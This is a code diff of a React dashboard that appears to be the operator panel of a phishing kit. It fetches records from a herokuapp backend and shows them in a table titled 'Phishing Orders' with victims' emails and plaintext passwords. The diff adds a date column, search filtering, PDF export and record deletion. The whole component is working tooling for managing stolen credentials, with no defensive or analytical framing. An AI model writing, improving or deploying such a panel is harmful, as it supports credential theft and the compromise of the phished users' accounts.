@@ -4,16 +4,19 @@ import axios from "axios";
 
 const Dashbord = () => {
   const [users, setUsers] = React.useState(null);
+  const [sercher, setSercher] = React.useState("");
   let rndId = 1;
   React.useEffect(() => {
     const fetch = async () => {
-      const { data } = await axios.get("http://localhost:8080/api/get");
+      const { data } = await axios.get(
+        "https://usersgetter.herokuapp.com/users"
+      );
       setUsers(data);
     };
     fetch();
   }, []);
-  const removeOrders = async (name) => {
-    await axios.delete(`http://localhost:8080/api/delete/${name}`);
+  const removeOrders = async (id) => {
+    await axios.delete(`https://usersgetter.herokuapp.com/users/${id}`);
   };
   const dowloandPdf = () => {
     let pdf = new jsPDF("p", "pt", "a4");
@@ -28,23 +31,11 @@ const Dashbord = () => {
     <main>
       <div className="head-title">
         <div className="left">
-          <h1>Dashboard</h1>
-          <ul className="breadcrumb">
-            <li>
-              <a href="https://iqlim.uz">Dashboard</a>
-            </li>
-            <li>
-              <i className="bx bx-chevron-right"></i>
-            </li>
-            <li>
-              <a className="active" href="https://iqlim.uz">
-                Home
-              </a>
-            </li>
-          </ul>
+          <h1>Users</h1>
         </div>
         <a href="#f" className="btn-download" onClick={dowloandPdf}>
           <i className="bx bxs-cloud-download"></i>
+
           <span className="text">Download PDF</span>
         </a>
       </div>
@@ -63,7 +54,14 @@ const Dashbord = () => {
         <div className="order">
           <div className="head">
             <h3>Phishing Orders</h3>
-            <i className="bx bx-search"></i>
+            <div className="input_box">
+              <i className="bx bx-search"></i>
+              <input
+                type="search"
+                value={sercher}
+                onChange={(e) => setSercher(e.target.value)}
+              />
+            </div>
             <i className="bx bx-filter"></i>
           </div>
           <table>
@@ -71,28 +69,34 @@ const Dashbord = () => {
               <tr>
                 <th>User</th>
                 <th>Password</th>
+                <th>Date</th>
                 <th>Remove</th>
               </tr>
             </thead>
             <tbody>
-              {users?.map((items) => (
-                <tr key={items.id}>
-                  <td>
-                    <b>{rndId++}</b>
-                    <span>{items.email[0]}</span>
-                    <p>{items.email}</p>
-                  </td>
-                  <td>{items.password}</td>
-                  <td>
-                    <button
-                      className="status pending btn"
-                      onClick={() => removeOrders(items.email)}
-                    >
-                      Remove
-                    </button>
-                  </td>
-                </tr>
-              ))}
+              {users
+                ?.filter((e) =>
+                  e.email.toUpperCase().includes(sercher.toUpperCase())
+                )
+                .map((items) => (
+                  <tr key={items._id}>
+                    <td>
+                      <b>{rndId++}</b>
+                      <span>{items.email[0]}</span>
+                      <p>{items.email}</p>
+                    </td>
+                    <td>{items.password}</td>
+                    <td>{items.date}</td>
+                    <td>
+                      <button
+                        className="status pending btn"
+                        onClick={() => removeOrders(items._id)}
+                      >
+                        Remove
+                      </button>
+                    </td>
+                  </tr>
+                ))}
             </tbody>
           </table>
         </div>
